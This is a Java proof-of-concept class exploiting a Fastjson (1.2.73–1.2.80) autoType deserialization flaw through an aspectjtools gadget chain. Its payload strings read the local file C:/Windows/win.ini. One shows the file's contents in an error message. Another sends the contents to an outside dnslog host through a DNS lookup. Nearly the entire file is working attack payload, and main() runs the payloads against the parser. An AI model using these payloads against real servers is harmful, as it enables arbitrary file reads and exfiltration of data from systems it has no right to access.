package test;

import com.alibaba.fastjson.JSON;

public class Fastjson19_ajt_read_error_dnslog_2 {
    public static void main(String[] args){
    	
        //依赖1.2.73-1.2.80，依赖aspectjtools 仅仅是将poc简化成发两个包
    	String poc1 = "[{\r\n"
    			+ "		\"@type\": \"java.lang.Exception\",\r\n"
    			+ "		\"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\"\r\n"
    			+ "	},\r\n"
    			+ "	{\r\n"
    			+ "		\"@type\": \"java.lang.Class\",\r\n"
    			+ "		\"val\": {\r\n"
    			+ "			\"@type\": \"java.lang.String\" {\r\n"
    			+ "				\"@type\": \"java.util.Locale\",\r\n"
    			+ "				\"val\": {\r\n"
    			+ "					\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
    			+ "					{\r\n"
    			+ "						\"@type\": \"java.lang.String\"\r\n"
    			+ "						\"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\",\r\n"
    			+ "						\"newAnnotationProcessorUnits\": [{}]\r\n"
    			+ "					}\r\n"
    			+ "				}\r\n"
    			+ "			},\r\n"
    			+ "			{\r\n"
    			+ "				\"x\": {\r\n"
    			+ "					\"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\r\n"
    			+ "					\"@type\": \"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\r\n"
    			+ "					\"fileName\": \"aaa\"\r\n"
    			+ "				}\r\n"
    			+ "			}]";
    	//报错回显
    	String poc2 = "{\r\n"
    			+ "\"@type\":\"java.lang.Character\"{\"c\":{\r\n"
    			+ "\"@type\":\"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\r\n"
    			+ "\"fileName\":\"C:/Windows/win.ini\"}}";
    	
    	
    	//dnslog带出，似乎只有mac环境才行
    	poc2 = "{\r\n"
    			+ "	\"a\": {\r\n"
    			+ "		\"@type\": \"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\r\n"
    			+ "		\"fileName\": \"C:/Windows/win.ini\"\r\n"
    			+ "	},\r\n"
    			+ "	\"b\": {\r\n"
    			+ "		\"@type\": \"java.net.Inet4Address\",\r\n"
    			+ "		\"val\": {\r\n"
    			+ "			\"@type\": \"java.lang.String\" {\r\n"
    			+ "				\"@type\": \"java.util.Locale\",\r\n"
    			+ "				\"val\": {\r\n"
    			+ "					\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
    			+ "					{\r\n"
    			+ "						\"@type\": \"java.lang.String\"\r\n"
    			+ "						\"@type\": \"java.util.Locale\",\r\n"
    			+ "						\"language\": {\r\n"
    			+ "							\"@type\": \"java.lang.String\" {\r\n"
    			+ "								\"$ref\": \"$\"\r\n"
    			+ "							},\r\n"
    			+ "							\"country\": \"17e92b3b.dns.1433.eu.org\"\r\n"
    			+ "						}\r\n"
    			+ "					}\r\n"
    			+ "				}\r\n"
    			+ "		";
    	

    	
    	System.out.println(poc1);
    	System.out.println(poc2);
        try {
            JSON.parseObject(poc1);
        } catch (Exception e){}
        JSON.parseObject(poc2);

        

    }
}
